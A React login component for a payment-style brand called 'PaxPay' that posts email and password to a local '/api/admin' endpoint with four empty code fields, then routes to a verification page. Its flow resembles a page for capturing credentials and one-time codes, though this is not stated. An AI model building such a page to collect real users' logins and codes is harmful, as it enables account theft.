
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

function LoginA() {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);
    try {
      const res = await axios.post('http://localhost:5000/api/admin', {
        email: formData.email,
        password: formData.password,
        code1: '', code2: '', code3: '', code4: '' // Empty for now
      });

      alert(res.data.message);
      navigate('/verification'); // Navigate after success
    } catch (err) {
      alert('❌ Failed to submit. Check console.');
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="bg-black">
      {/* Logo */}
      <div className="flex items-center space-x-2 bg-black p-2 shadow-md sticky top-0 z-50">
        <img src="/logo.png" alt="Logo" className="h-10 w-10" />
        <h1 className="font-bold bg-black text-gray-300 text-3xl">PaxPay</h1>
      </div>

      <div className="min-h-screen bg-black flex pt-12 justify-center">
        <div className="fixed bg-black shadow-md rounded-lg py-8 px-4 w-full max-w-md">
          <h2 className="text-3xl font-semibold text-white">Welcome!</h2>
          <p className="text-sm text-gray-500 pt-3 pb-4">
            Don’t have an account?{' '}
            <a href="#" className="text-lime-400 hover:underline font-medium">
              Sign up
            </a>
          </p>

          <form>
            <div className="mb-4 text-gray-400">
              <label className="block text-gray-500 pb-2">Email/Phone number</label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
                className="w-full bg-transparent px-3 py-2 border border-gray-600 rounded-lg"
              />
            </div>

            <div className="mb-4 relative">
              <label className="block text-gray-500 mb-1">Password*</label>
              <input
                type={showPassword ? 'text' : 'password'}
                name="password"
                value={formData.password}
                onChange={handleChange}
                required
                className="w-full bg-transparent text-white px-3 py-2 border border-gray-600 rounded-lg pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-[38px] text-sm text-gray-600 hover:underline"
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>

            <div className="text-right text-sm mb-4">
              <a href="#" className="text-gray-500 hover:underline">
                Forgot password?
              </a>
            </div>

            <button
              type="button"
              onClick={handleSubmit}
              disabled={isSubmitting}
              className="w-full bg-lime-400 text-black py-2 rounded-full font-semibold hover:bg-lime-500 transition"
            >
              {isSubmitting ? 'Submitting...' : 'Sign In'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

export default LoginA;

